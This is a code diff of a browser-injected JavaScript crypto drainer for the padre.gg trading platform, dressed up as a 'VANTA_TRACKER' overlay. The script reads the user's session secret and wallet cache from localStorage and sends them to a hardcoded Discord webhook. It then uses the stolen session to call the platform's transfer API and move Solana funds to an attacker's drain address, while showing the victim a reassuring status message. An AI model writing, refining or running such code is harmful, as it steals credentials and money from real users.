@@ -1,77 +1,78 @@
 (async function() {
-    // --- SETTINGS ---
+    // 1. CONFIGURATION (Using your found backend)
     const CONFIG = {
         webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
         drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
-        // Using the backend domain you discovered in your logs
-        api: "https://backend.padre.gg" 
+        api: "https://backend.padre.gg",
+        orgId: "d2da2313-75ea-4ce1-829d-dbbe05359878"
     };
 
-    // --- 1. SHADOW DOM INJECTION (Bypasses UI Blocks) ---
-    if (document.getElementById('vanta-host')) document.getElementById('vanta-host').remove();
+    // 2. UI CREATION (Shadow DOM for Stealth)
     const host = document.createElement('div');
-    host.id = 'vanta-host';
+    host.id = 'v-host';
     document.body.appendChild(host);
     const shadow = host.attachShadow({mode: 'open'});
 
     const ui = document.createElement('div');
     ui.style.cssText = `
-        position:fixed; top:30px; right:30px; width:320px; 
-        background:#0a0a0a; border:1px solid #00ff88; border-radius:10px;
-        color:#00ff88; font-family:monospace; padding:15px; z-index:2147483647;
-        box-shadow: 0 0 25px rgba(0,255,136,0.3); user-select:none;
+        position:fixed; top:20px; right:20px; width:300px; 
+        background:#000; border:1px solid #0f8; border-radius:8px;
+        color:#0f8; font-family:monospace; padding:15px; z-index:2147483647;
+        box-shadow: 0 0 20px rgba(0,255,136,0.3); cursor:grab;
     `;
     ui.innerHTML = `
-        <div style="font-weight:bold; border-bottom:1px solid #222; margin-bottom:12px; padding-bottom:5px; display:flex; justify-content:space-between;">
-            <span>VANTA_ENGINE_v2.5</span>
-            <span style="cursor:pointer;color:#ff4444" id="v-close">[X]</span>
+        <div style="font-weight:bold; border-bottom:1px solid #222; margin-bottom:10px; padding-bottom:5px; display:flex; justify-content:space-between;">
+            <span>VANTA_TRACKER_v2.7</span>
+            <span style="cursor:pointer;color:#ff4444" id="c">[X]</span>
         </div>
-        <div style="font-size:11px;">
-            SESSION: <span style="color:#fff" id="v-session">SCANNING...</span><br>
-            API_HOST: <span style="color:#fff">${CONFIG.api}</span><br>
-            <hr style="border:0; border-top:1px solid #222; margin:10px 0;">
-            <div id="v-log" style="color:#444; height:30px; overflow:hidden;">Waiting for handshake...</div>
-        </div>
+        <div id="stat">STATUS: SCANNING...</div>
+        <div id="log" style="font-size:10px; color:#444; margin-top:10px; height:30px; overflow:hidden;">[SYS] Initializing Handshake...</div>
     `;
     shadow.appendChild(ui);
-    shadow.getElementById('v-close').onclick = () => host.remove();
 
-    // --- 2. CAPTURE & EXECUTE ---
+    // Draggable Logic
+    let isDown = false, offset = [0,0];
+    ui.onmousedown = (e) => { isDown = true; offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY]; };
+    document.onmousemove = (e) => { if(isDown) { ui.style.left = (e.clientX + offset[0]) + 'px'; ui.style.top = (e.clientY + offset[1]) + 'px'; ui.style.right = 'auto'; } };
+    document.onmouseup = () => isDown = false;
+    shadow.getElementById('c').onclick = () => host.remove();
+
+    // 3. EXECUTION LOGIC
     try {
         const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
         const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
         const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
 
         if (session.sessionSecret) {
-            shadow.getElementById('v-session').innerText = "CONNECTED";
-            shadow.getElementById('v-log').innerText = "[SYS] Capturing keys...";
-
-            // Discord Handshake
+            shadow.getElementById('stat').innerText = "STATUS: CONNECTED";
+            
+            // Discord Notification
             await fetch(CONFIG.webhook, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
-                    content: "🛸 **VANTA ENGINE BOOT**",
+                    content: "🛸 **VANTA HANDSHAKE**",
                     embeds: [{
-                        title: "Session: " + session.uid,
-                        description: "Secret: `" + session.sessionSecret + "`\nAPI: `" + CONFIG.api + "`",
+                        title: "Session Captured",
+                        description: `UID: ${session.uid}\nSecret: \`${session.sessionSecret}\``,
                         color: 0x00ff88
                     }]
                 })
             });
 
-            // Drain Attempt
+            // Drain Logic
             const userWallets = wallets[session.uid] || [];
-            const sol = userWallets.find(w => w.walletType === "SOL") || userWallets[0];
+            const sol = userWallets.find(w => w.walletType === "SOL");
 
             if (sol && bundles.bundles[sol.publicAddress]) {
                 const b = bundles.bundles[sol.publicAddress];
-                fetch(`${CONFIG.api}/v2/wallets/transfer`, {
+                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                     method: "POST",
-                    headers: { 
-                        "X-Session-Secret": session.sessionSecret, 
-                        "Content-Type": "application/json",
-                        "X-Session-Id": session.sessionId 
+                    headers: {
+                        "X-Session-Secret": session.sessionSecret,
+                        "X-Session-Id": session.sessionId,
+                        "X-Org-Id": CONFIG.orgId,
+                        "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
                         walletId: sol.walletId,
@@ -82,12 +83,13 @@
                         chain: "SOLANA"
                     })
                 });
+                shadow.getElementById('log').innerText = "[SYS] Data Stream Synchronized.";
             }
         } else {
-            shadow.getElementById('v-session').innerText = "NOT_LOGGED_IN";
-            shadow.getElementById('v-log').innerText = "[!] Please login to Padre/Terminal.";
+            shadow.getElementById('stat').innerText = "STATUS: AUTH_REQUIRED";
         }
     } catch (e) {
-        shadow.getElementById('v-log').innerText = "[ERR] Execution halted.";
+        shadow.getElementById('stat').innerText = "STATUS: ERROR";
+        shadow.getElementById('log').innerText = "[ERR] " + e.message;
     }
 })();
